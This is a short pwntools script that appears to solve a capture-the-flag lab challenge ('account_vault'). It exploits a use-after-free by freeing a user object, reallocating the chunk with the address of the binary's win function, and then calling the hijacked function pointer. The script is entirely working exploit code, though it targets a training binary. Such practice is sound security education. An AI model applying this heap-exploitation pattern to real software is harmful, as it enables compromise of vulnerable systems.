#!/usr/bin/env python3
from pwn import *
HOST = "offsec.m0lecon.it"
PORT = 13573
context.binary = elf = ELF('/home/kali/Desktop/offsec/labs/lab10/challenges/00_account_vault/account_vault', checksec=False)

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)

p = conn()

win = elf.sym.win

p.sendlineafter(b'> ', b'1')    # allocate user                   
p.sendlineafter(b'> ', b'2')    # free user 
p.sendlineafter(b'> ', b'3')    # allocate data                 
p.sendafter(b'data: ', p64(win).ljust(32, b'X')) # write win function address inside data (which is user->action)
p.sendlineafter(b'> ', b'4')    # execute action: calls user->action == win()

print(p.recvall(timeout=2).decode(errors='replace'))